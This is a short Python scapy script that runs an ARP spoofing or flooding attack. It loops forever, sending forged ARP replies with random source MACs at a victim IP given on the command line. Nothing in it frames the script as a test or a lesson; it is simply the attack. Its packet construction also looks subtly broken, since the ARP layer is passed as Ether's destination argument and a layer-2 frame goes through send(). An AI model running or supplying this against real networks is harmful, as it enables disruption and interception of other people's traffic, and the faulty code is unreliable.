from scapy.all import (ARP, Ether, conf, send, get_if_hwaddr, RandMAC)
import sys

def main():
    
    victim_ip = sys.argv[1]
    
    def whohas():
        packet= Ether(ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=RandMAC()))
        send(packet)
    while True:
        whohas()

main()